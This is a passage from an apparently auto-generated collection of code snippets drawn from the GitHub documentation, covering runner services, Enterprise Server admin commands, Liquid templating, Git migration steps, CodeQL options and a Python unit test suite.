\"Hello World\"\n```\n\n</details>\n```\n\n----------------------------------------\n\nTITLE: Building the Project\nDESCRIPTION: This command builds the project. It is a prerequisite for running the Playwright tests.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/PLAYWRIGHT.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm run build\n```\n\n----------------------------------------\n\nTITLE: Stopping Runner Service - Linux\nDESCRIPTION: Stops the self-hosted runner service on Linux systems using `svc.sh`. Requires root privileges.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/configuring-the-self-hosted-runner-application-as-a-service.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\nsudo ./svc.sh stop\n```\n\n----------------------------------------\n\nTITLE: Starting Runner Service - Linux\nDESCRIPTION: Starts the self-hosted runner service on Linux systems using `svc.sh`. Requires root privileges.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/configuring-the-self-hosted-runner-application-as-a-service.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nsudo ./svc.sh start\n```\n\n----------------------------------------\n\nTITLE: Expanding Search Index for Cluster Configuration - Shell\nDESCRIPTION: This command expands the search index for a cluster configuration of GitHub Enterprise Server. It runs a script via the administrative shell, specifically tailored for cluster configurations, ensuring proper configuration of search indices.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-web-ui/managing-search-indices-for-your-instance.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n/usr/local/share/enterprise/ghe-es-auto-expand -v 0-1\n```\n\n----------------------------------------\n\nTITLE: Creating a TopoJSON map\nDESCRIPTION: This code snippet shows how to create a TopoJSON map by specifying coordinates and shapes. It defines a Topology with a GeometryCollection that includes a Point, LineString, and Polygon. The map is rendered based on the specified topology and geometry.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/creating-diagrams.md#_snippet_3\n\nLANGUAGE: TopoJSON\nCODE:\n```\n{\n  \"type\": \"Topology\",\n  \"transform\": {\n    \"scale\": [0.0005000500050005, 0.00010001000100010001],\n    \"translate\": [100, 0]\n  },\n  \"objects\": {\n    \"example\": {\n      \"type\": \"GeometryCollection\",\n      \"geometries\": [\n        {\n          \"type\": \"Point\",\n          \"properties\": {\"prop0\": \"value0\"},\n          \"coordinates\": [4000, 5000]\n        },\n        {\n          \"type\": \"LineString\",\n          \"properties\": {\"prop0\": \"value0\", \"prop1\": 0},\n          \"arcs\": [0]\n        },\n        {\n          \"type\": \"Polygon\",\n          \"properties\": {\"prop0\": \"value0\",\n            \"prop1\": {\"this\": \"that\"}\n          },\n          \"arcs\": [[1]]\n        }\n      ]\n    }\n  },\n  \"arcs\": [[[4000, 0], [1999, 9999], [2000, -9999], [2000, 9999]],[[0, 0], [0, 9999], [2000, 0], [0, -9999], [-2000, 0]]]\n}\n```\n\n----------------------------------------\n\nTITLE: Get Article Metadata and Content - cURL\nDESCRIPTION: This cURL command retrieves article metadata and content from the `/api/article` endpoint. It requires a `pathname` parameter specifying the article path. The command returns a JSON object containing the article's metadata (title, intro, product) and body content.\nSOURCE: https://github.com/github/docs/blob/main/src/article-api/README.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl -s \"https://docs.github.com/api/article?pathname=/en/get-started/start-your-journey/about-github-and-git\"\n```\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"meta\": {\n    \"title\": \"About GitHub and Git\",\n    \"intro\": \"You can use GitHub and Git to collaborate on work.\",\n    \"product\": \"Get started\"\n  },\n  \"body\": \"## About GitHub\\n\\nGitHub is a cloud-based platform where you can store, share, and work together with others to write code.\\n\\nStoring your code in a \\\"repository\\\" on GitHub allows you to:\\n\\n* **Showcase or share** your work.\\n [...]\"\n}\n```\n\n----------------------------------------\n\nTITLE: Verifying CNAME Records with dig in Shell\nDESCRIPTION: This command uses the `dig` utility to query DNS records and verify that the CNAME record for a subdomain is correctly configured. It suppresses statistics, comments, and command details, displaying only the relevant CNAME information.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/configuring-a-custom-domain-for-your-github-pages-site/managing-a-custom-domain-for-your-github-pages-site.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n$ dig WWW.EXAMPLE.COM +nostats +nocomments +nocmd\n> ;WWW.EXAMPLE.COM.                    IN      A\n> WWW.EXAMPLE.COM.             3592    IN      CNAME   YOUR-USERNAME.github.io.\n> YOUR-USERNAME.github.io.      43192   IN      CNAME   GITHUB-PAGES-SERVER .\n> GITHUB-PAGES-SERVER .         22      IN      A       192.0.2.1\n```\n\n----------------------------------------\n\nTITLE: Configuring package.json Dependencies (JSON)\nDESCRIPTION: This snippet shows how to configure the `dependencies` section of a `package.json` file to install a package from GitHub Packages. The `ORGANIZATION_NAME/PACKAGE_NAME` placeholder should be replaced with the actual name of the desired package. The version is also specified.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-npm-registry.md#_snippet_7\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"name\": \"@my-org/server\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Server app that uses the ORGANIZATION_NAME/PACKAGE_NAME package\",\n  \"main\": \"index.js\",\n  \"author\": \"\",\n  \"license\": \"MIT\",\n  \"dependencies\": {\n    \"ORGANIZATION_NAME/PACKAGE_NAME\": \"1.0.0\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing Codespace via SSH using GitHub CLI\nDESCRIPTION: This command provides SSH access to a GitHub Codespace from the command line. It uses the GitHub CLI to establish an SSH connection to the codespace, allowing for terminal-based interaction.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/opening-an-existing-codespace.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace ssh\n```\n\n----------------------------------------\n\nTITLE: Example Author Mapping in authors.txt - Text\nDESCRIPTION: This example shows the format required for the `authors.txt` file, which maps Subversion usernames to Git author names and email addresses. Each line defines a mapping in the format `svn_username = Git Name <email@example.com>`.  This file is used by `git svn` to correctly attribute commits during the conversion process.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-a-subversion-repository.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\noctocat = The Octocat <octocat@github.com>\n```\n\n----------------------------------------\n\nTITLE: Searching models by publisher on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to search for models released by 'Mistral AI' using the `publisher` qualifier. The publisher name is enclosed in quotes because it contains a space.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_11\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=publisher:%22Mistral+AI%22&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Conditional Title using Liquid\nDESCRIPTION: This snippet demonstrates conditional rendering of the page title based on the `ifversion` Liquid tag. If the version is `fpt`, the title will be \"Hello {% data variables.product.product_name %}\", otherwise it will be \"Greetings {% data variables.product.product_name %}\".\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/start-your-journey/dynamic-title.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt %}Hello{% else %}Greetings{% endif %} {% data variables.product.product_name %}\n```\n\n----------------------------------------\n\nTITLE: Removing a Local Git Repository - Shell\nDESCRIPTION: Removes the temporary local directory that holds the cloned Git repository. This is a cleanup step performed after the repository has been successfully mirrored to GitHub. Requires the `rm` command to be available.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-an-external-git-repository-using-the-command-line.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ncd ..\nrm -rf REPO.git\n```\n\n----------------------------------------\n\nTITLE: Commenting code with Copilot (Python)\nDESCRIPTION: This snippet demonstrates using {% data variables.product.prodname_copilot_short %} to generate helpful comments in a Python file to improve readability. It shows the prompt used to generate comments.  Dependencies include Python and a Python file.\nSOURCE: https://github.com/github/docs/blob/main/content/account-and-profile/setting-up-and-managing-your-github-profile/customizing-your-profile/using-your-github-profile-to-enhance-your-resume.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nHelp me write some helpful comments on this file so that it's easy to understand.\n```\n\n----------------------------------------\n\nTITLE: Adding SSH Feature to devcontainer.json (JSONC)\nDESCRIPTION: This JSONC snippet demonstrates how to configure the `features` object in a `devcontainer.json` file to include the `sshd` feature.  This ensures that an SSH server is running within the Codespace environment. The snippet specifies the feature's location and sets the version to \"latest\".\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/codespaces/ssh-server-installed.md#_snippet_0\n\nLANGUAGE: JSONC\nCODE:\n```\n\"features\": {\n    // ...\n    \"ghcr.io/devcontainers/features/sshd:1\": {\n        \"version\": \"latest\"\n    },\n    // ...\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Dependent Library Pack in YAML\nDESCRIPTION: This YAML snippet defines the dependent library pack `my-company/my-library2` within the same workspace. The library is set to true and the version is set to 4.5.6. This pack has no dependencies in this example.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/about-codeql-workspaces.md#_snippet_5\n\nLANGUAGE: YAML\nCODE:\n```\nname: my-company/my-library2\nlibrary: true\nversion: 4.5.6\n```\n\n----------------------------------------\n\nTITLE: Workflow Concurrency Configuration\nDESCRIPTION: This YAML snippet configures workflow concurrency to limit runs on the `main` branch. It defines a concurrency group based on the workflow name and Git ref, and cancels any in-progress runs when a new push event occurs.  This ensures only one run for a specific branch is active at a time.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/actions-group-concurrency.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  push:\n    branches:\n      - main\n\nconcurrency:\n  group: {% raw %}${{ github.workflow }}-${{ github.ref }}{% endraw %}\n  cancel-in-progress: true\n```\n\n----------------------------------------\n\nTITLE: Cloning a Repository (Bare Clone)\nDESCRIPTION: Creates a bare clone of a Git repository. A bare clone doesn't have a working directory and is optimized for sharing and pushing. This is the first step in mirroring a repository.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/duplicating-a-repository.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit clone --bare https://{% data variables.product.product_url %}/EXAMPLE-USER/OLD-REPOSITORY.git\n```\n\n----------------------------------------\n\nTITLE: Searching models by MIT license on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to search for models that use the MIT license with the `license` qualifier.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_17\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=license:mit&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Example Update Command Output\nDESCRIPTION: This showcases the expected output when running the `gh actions-importer update` command, indicating that the container image is being updated or is already up-to-date.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-circleci-with-github-actions-importer.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nUpdating ghcr.io/actions-importer/cli:latest...\nghcr.io/actions-importer/cli:latest up-to-date\n```\n\n----------------------------------------\n\nTITLE: Disabling Liquid Processing (HTML)\nDESCRIPTION: Shows how to use <code>&#123;% raw %&#125;</code> and <code>&#123;% endraw %&#125;</code> tags to prevent Liquid from processing content containing curly brackets.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/setting-up-your-environment-to-work-on-github-docs/troubleshooting-your-environment.md#_snippet_6\n\nLANGUAGE: html\nCODE:\n```\nGITHUB_TOKEN: &#123;% raw %&#125;${% raw %}{{ secrets.GITHUB_TOKEN }}{% endraw %}&#123;% endraw %&#125;\n```\n\n----------------------------------------\n\nTITLE: Enabling and Configuring Actions Rate Limiting via ghe-config\nDESCRIPTION: This snippet demonstrates how to enable and configure the rate limit for GitHub Actions using the `ghe-config` utility in the administrative shell. It sets the `actions-rate-limiting.enabled` property to `true` and specifies the number of runs per minute using `actions-rate-limiting.queue-runs-per-minute`. The value of `RUNS-PER-MINUTE` should be replaced with the desired limit.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-user-applications-for-your-enterprise/configuring-rate-limits.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-config actions-rate-limiting.enabled true\nghe-config actions-rate-limiting.queue-runs-per-minute RUNS-PER-MINUTE\n```\n\n----------------------------------------\n\nTITLE: HTTPS Link Tag in HTML\nDESCRIPTION: This HTML snippet demonstrates how to reference a CSS file over HTTPS.  By changing `http://` to `https://` in the `href` attribute, the browser will request the CSS file securely. This is part of resolving mixed content issues when enforcing HTTPS on a website.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/getting-started-with-github-pages/securing-your-github-pages-site-with-https.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<link rel=\"stylesheet\" href=\"https://example.com/css/main.css\">\n```\n\n----------------------------------------\n\nTITLE: Aborting a Migration\nDESCRIPTION: This snippet shows how to abort a running migration using the `gh gei abort-migration` command. It requires the `MIGRATION-ID` of the migration to be aborted.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-github-enterprise-server-to-github-enterprise-cloud.md#_snippet_13\n\nLANGUAGE: Shell\nCODE:\n```\ngh gei abort-migration --migration-id MIGRATION-ID\n```\n\n----------------------------------------\n\nTITLE: Disabling web commit signing using ghe-config in bash\nDESCRIPTION: This command disables web commit signing by setting the `app.github.web-commit-signing-enabled` configuration option to `false` using the `ghe-config` utility. It requires access to the administrative shell of GitHub Enterprise Server.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-user-applications-for-your-enterprise/configuring-web-commit-signing.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nghe-config app.github.web-commit-signing-enabled false\n```\n\n----------------------------------------\n\nTITLE: Conditional Autobuild based on language (YAML)\nDESCRIPTION: This example shows how to conditionally execute an autobuild step, based on the matrix language. If the language is C/C++ or C#, the autobuild step runs, otherwise, manual build steps for Java are executed.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/codeql-code-scanning-for-compiled-languages.md#_snippet_7\n\nLANGUAGE: YAML\nCODE:\n```\n- if: matrix.language == 'c-cpp' || matrix.language == 'csharp'\n  name: Autobuild\n  uses: {% data reusables.actions.action-codeql-action-autobuild %}\n- if: matrix.language == 'java-kotlin'\n  name: Build Java\n  run: |\n    make bootstrap\n    make release\n```\n\n----------------------------------------\n\nTITLE: Markdown Horizontal rule and quote example\nDESCRIPTION: Markdown example for horizontal rule and a quote\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/quickstart-for-writing-on-github.md#_snippet_9\n\nLANGUAGE: markdown\nCODE:\n```\n---\n> If we pull together and commit ourselves, then we can push through anything.\n\n— Mona the Octocat\n```\n\n----------------------------------------\n\nTITLE: Deleting Network Settings Resource with Azure CLI\nDESCRIPTION: This snippet demonstrates how to delete a network settings resource using the Azure CLI. Before running this command, ensure you have the Azure CLI installed and configured with the correct subscription. The command removes the specified network settings resource from the specified resource group, effectively removing the service association link and allowing the subnet to be deleted.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/azure-vnet-deleting-a-subnet.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\naz account set --subscription $SUBSCRIPTION_ID\naz resource delete -g $RESOURCE_GROUP_NAME --name $NETWORK_SETTINGS_RESOURCE_NAME --resource-type 'GitHub.Network/networkSettings' --api-version $API_VERSION\n```\n\n----------------------------------------\n\nTITLE: Searching models by output tokens less than on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to search for models with an output token limit less than 8,000 using the `output-tokens` qualifier with the `<` operator.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_14\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=output-tokens:%3C8000&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Applying Reusable Instructions from Another Pack - YAML\nDESCRIPTION: This example applies reusable instructions from a different CodeQL pack.  It loads queries from the default suite of `my-org/my-other-custom-queries` and then applies the reusable instructions from the `my-org/my-custom-instructions` pack, specifying a version constraint for the latter.  The from field specifies the location of the reusable instructions.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_17\n\nLANGUAGE: yaml\nCODE:\n```\n# load queries from the default suite of my-org/my-other-custom-queries\n- qlpack: my-org/my-other-custom-queries\n\n# apply the reusable instructions from the my-org/my-custom-instructions {% data variables.product.prodname_codeql %} pack\n- apply: reusable-instructions.yml\n  from: my-org/my-custom-instructions\n  version: ^1.2.3 # optional\n```\n\n----------------------------------------\n\nTITLE: Setting up Replication for First Replica in Geo-Replication\nDESCRIPTION: These commands configure and start the first replica in a geo-replication setup.  `PRIMARY_IP` needs to be replaced with the primary server's IP. The `ghe-repl-setup` command prepares the replica and `ghe-repl-start` command initiates the replication process.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/creating-a-high-availability-replica.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\n(replica1)$ ghe-repl-setup PRIMARY_IP\n```\n\nLANGUAGE: Shell\nCODE:\n```\n(replica1)$ ghe-repl-start\n```\n\n----------------------------------------\n\nTITLE: Automatically fixing errors in specific files/directories\nDESCRIPTION: This command automatically fixes errors that have the `fixable: true` property in their description on the specified files or directories.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-the-content-linter.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nnpm run lint-content -- \\\n  --fix --paths content/FILENAME.md content/DIRECTORY\n```\n\n----------------------------------------\n\nTITLE: Authenticating as root site administrator via HTTP with curl\nDESCRIPTION: Demonstrates how to authenticate as the root site administrator to access the Management Console API using standard HTTP authentication with `curl`. It involves replacing `HOSTNAME`, `ADMIN-PORT` and `YOUR_PASSWORD` with actual values. The password is sent in the HTTP Authorization header.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/enterprise-admin/management-console.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncurl -L -u \"api_key:YOUR_PASSWORD\" 'https://HOSTNAME:ADMIN-PORT/setup/api'\n```\n\n----------------------------------------\n\nTITLE: Specifying Extractor Options File with --extractor-options-file\nDESCRIPTION: This command-line option allows specifying extractor option bundle files, which can be either JSON (``.json``) or YAML (``.yaml`` or ``.yml``) files.  The file must have the top-level map key 'extractor' and, under it, extractor names as second-level map keys. Further levels of maps represent nested extractor groups. Multiple values for array options will use all the values provided, in order, while string options will use the last value provided.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/database-create.md#_snippet_2\n\nLANGUAGE: Text\nCODE:\n```\n--extractor-options-file=<extractor-options-bundle-file>\n```\n\n----------------------------------------\n\nTITLE: Advanced JVM Option with -J\nDESCRIPTION: This advanced option allows passing options directly to the JVM running the command.  Beware that options containing spaces will not be handled correctly. This is primarily for advanced users who need fine-grained control over the JVM's behavior.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/database-create.md#_snippet_3\n\nLANGUAGE: Text\nCODE:\n```\n-J=<opt>\n```\n\n----------------------------------------\n\nTITLE: Exiting an SSH session\nDESCRIPTION: This command exits the current SSH session.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/forwarding-ports-in-your-codespace.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nexit\n```\n\n----------------------------------------\n\nTITLE: Decoding Base64 SAML Response - Shell\nDESCRIPTION: This snippet shows how to decode Base64-encoded SAML responses from the systemd journal logs for `github-unicorn` on GitHub Enterprise Server. This is useful for troubleshooting failed authentication attempts by inspecting the SAML response content.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/using-saml-for-enterprise-iam/troubleshooting-saml-authentication.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nbase64 --decode ENCODED_OUTPUT\n```\n\n----------------------------------------\n\nTITLE: Unblocking All IPs on Cluster Nodes (ghe-cluster-unblock-ips)\nDESCRIPTION: This command unblocks all currently blocked IPv4 addresses on every node within the cluster.  This effectively resets any IP-based restrictions that were previously applied to the cluster's network access. It does not require any input parameters.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_42\n\nLANGUAGE: shell\nCODE:\n```\nghe-cluster-unblock-ips\n```\n\n----------------------------------------\n\nTITLE: Configuring Git gpg.program globally\nDESCRIPTION: Configures Git's `gpg.program` to use `smimesign` globally.  This is applicable for Git versions 2.18 or earlier.  The `--global` flag ensures the configuration applies to all repositories.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/x-509-key.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngit config --global gpg.program smimesign\n```\n\n----------------------------------------\n\nTITLE: Git Clone Command\nDESCRIPTION: This snippet shows how to clone a Git repository using HTTPS with an installation token for authentication. The token is used as the password in the URL.  The URL includes the repository owner and name. The command is meant to be executed from a shell environment.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_31\n\nLANGUAGE: shell\nCODE:\n```\ngit clone https://x-access-token:TOKEN@github.com/OWNER/REPO.git\n```\n\n----------------------------------------\n\nTITLE: Pulling Docker Image from GitHub Packages (GHES, Subdomain Isolation Disabled)\nDESCRIPTION: This snippet illustrates how to pull a Docker image from GitHub Packages using GitHub Enterprise Server when subdomain isolation is disabled. It requires Docker to be installed and configured. Replace HOSTNAME, OWNER, REPOSITORY, IMAGE_NAME, and TAG_NAME with the appropriate values for your image.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-docker-registry.md#_snippet_15\n\nLANGUAGE: Shell\nCODE:\n```\ndocker pull HOSTNAME/OWNER/REPOSITORY/IMAGE_NAME:TAG_NAME\n```\n\n----------------------------------------\n\nTITLE: Complete BankAccount Integration Test Suite in Python\nDESCRIPTION: This comprehensive test suite includes test cases for both deposit and withdrawal functionalities of the BankAccount class, covering valid and invalid scenarios. It uses mocks to simulate the NotificationSystem and verifies correct interactions. It also tests for error raising when initial balance is negative. It covers deposits, withdrawals, and negative initial balances.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/writing-tests-with-github-copilot.md#_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nimport unittest\nfrom unittest.mock import Mock\nfrom bank_account import BankAccount\n\nclass TestBankAccountIntegration(unittest.TestCase):\n    def setUp(self):\n        self.notification_system = Mock()\n\n    def test_deposit_with_notification(self):\n        account = BankAccount(initial_balance=100, notification_system=self.notification_system)\n        account.deposit(50)\n        self.assertEqual(account.get_balance(), 150)\n        self.notification_system.notify.assert_called_once_with(\"Deposited 50, new balance: 150\")\n\n    def test_deposit_negative_amount_raises_error(self):\n        account = BankAccount(initial_balance=100, notification_system=self.notification_system)\n        with self.assertRaises(ValueError):\n            account.deposit(-50)\n        self.notification_system.notify.assert_not_called()\n\n    def test_deposit_zero_amount_raises_error(self):\n        account = BankAccount(initial_balance=100, notification_system=self.notification_system)\n        with self.assertRaises(ValueError):\n            account.deposit(0)\n        self.notification_system.notify.assert_not_called()\n\n    def test_withdraw_with_notification(self):\n        account = BankAccount(initial_balance=100, notification_system=self.notification_system)\n        account.withdraw(30)\n        self.assertEqual(account.get_balance(), 70)\n        self.notification_system.notify.assert_called_once_with(\"Withdrew 30, new balance: 70\")\n\n    def test_withdraw_exceeding_balance_raises_error(self):\n        account = BankAccount(initial_balance=100, notification_system=self.notification_system)\n        with self.assertRaises(ValueError):\n            account.withdraw(150)\n        self.notification_system.notify.assert_not_called()\n\n    def test_withdraw_negative_amount_raises_error(self):\n        account = BankAccount(initial_balance=100, notification_system=self.notification_system)\n        with self.assertRaises(ValueError):\n            account.withdraw(-30)\n        self.notification_system.notify.assert_not_called()\n\n    def test_withdraw_zero_amount_raises_error(self):\n        account = BankAccount(initial_balance=100, notification_system=self.notification_system)\n        with self.assertRaises(ValueError):\n            account.withdraw(0)\n        self.notification_system.notify.assert_not_called()\n\n    def test_initial_negative_balance_raises_error(self):\n        with self.assertRaises(ValueError):\n            BankAccount(initial_balance=-100, notification_system=self.notification_system)\n\nif __name__ == '__main__':\n    unittest.main()\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies for CodeQL Pack (Shell)\nDESCRIPTION: This command installs the dependencies for a CodeQL pack, using the versions specified in the `codeql-pack.lock.yml` file if it exists. If the lock file is incompatible or doesn't exist, it installs the latest compatible versions and updates or creates the lock file. The `<dir>` parameter specifies the root directory of the package.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/pack-install.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql pack install [--force] <options>... -- <dir>\n```\n\n----------------------------------------\n\nTITLE: Nagios Command Definition\nDESCRIPTION: This snippet provides an example Nagios command definition that uses the `check_by_ssh` plugin to execute the `ghe-cluster-status -n` command on the GitHub Enterprise Server node.  It specifies the SSH user, port, and timeout.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster.md#_snippet_6\n\nLANGUAGE: text\nCODE:\n```\ndefine command {\n     command_name    check_ssh_ghe_cluster\n     command_line    $USER1$/check_by_ssh -H $HOSTADDRESS$ -C \"ghe-cluster-status -n\" -l admin -p 122 -t 30\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Alternative Suggestions using GitHub Copilot in Java\nDESCRIPTION: This code snippet shows how GitHub Copilot suggests code for a given Java line. This functionality is triggered when the user types the first line of a Java statement and presses Enter, prompting Copilot to offer a suggestion. This snippet highlights how to view and select alternative suggestions provided by GitHub Copilot.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/getting-code-suggestions-in-your-ide-with-github-copilot.md#_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\n{% indented_data_reference reusables.copilot.java-int-snippet spaces=3 %}\n```\n\n----------------------------------------\n\nTITLE: Coding Guideline Example: Don't Use SELECT * in SQL Queries\nDESCRIPTION: This example defines a coding guideline that discourages the use of `SELECT *` in SQL queries.  It recommends always specifying the desired columns except when using `COUNT(*)` and applies to all file types.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/code-review/configuring-coding-guidelines.md#_snippet_2\n\n\n\n----------------------------------------\n\nTITLE: Nested Conditional Rendering with GHES and 'not FPT'\nDESCRIPTION: This snippet first checks the GHES version. If within the specified range, it renders \"Alpha\". It then checks if the context is not FPT, and if so, renders \"Bravo\". If the GHES version is outside the specified range, it renders \"Charlie\".\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/and-greater-than2.md#_snippet_4\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes > 2.13 and ghes < 2.16 %}\n\nAlpha\n\n{% ifversion not fpt %}\n\nBravo\n\n{% endif %}\n\n{% else %}\n\nCharlie\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Managing Distributed Pages Server (ghe-dpages)\nDESCRIPTION: This command allows you to manage the distributed GitHub Pages server. Without arguments, it likely provides a general interface or displays available subcommands. Use it to interact with the Pages service.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_44\n\nLANGUAGE: shell\nCODE:\n```\nghe-dpages\n```\n\n----------------------------------------\n\nTITLE: Credentials File Example (YAML)\nDESCRIPTION: Demonstrates the format of a credentials file used with `--credentials-file` to provide authentication details for different servers.  The file contains a list of server URLs and corresponding access tokens and usernames, allowing Actions Importer to authenticate to various source code providers such as GitHub, GitLab, and Jenkins.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/supplemental-arguments-and-settings.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n- url: https://github.com\n  access_token: ghp_mygeneraltoken\n- url: https://github.com/specific_org/\n  access_token: ghp_myorgspecifictoken\n- url: https://jenkins.org\n  access_token: abc123\n  username: marty_mcfly\n```\n\nLANGUAGE: yaml\nCODE:\n```\n- url: https://gitlab.com\n  access_token: super_secret_token\n  provider: gitlab\n```\n\n----------------------------------------\n\nTITLE: Building Xamarin.Android app with GitHub Actions\nDESCRIPTION: This YAML workflow configures a GitHub Actions job to build a Xamarin.Android application. It sets the default Xamarin SDK versions, sets up the .NET Core SDK, installs dependencies using NuGet, and builds the project using MSBuild.  The workflow is triggered on every push.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-xamarin-applications.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nname: Build Xamarin.Android app\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: macos-latest\n\n    steps:\n    - uses: {% data reusables.actions.action-checkout %}\n    - name: Set default Xamarin SDK versions\n      run: |\n        $VM_ASSETS/select-xamarin-sdk-v2.sh --mono=6.10 --android=10.2\n\n    - name: Setup .NET Core SDK 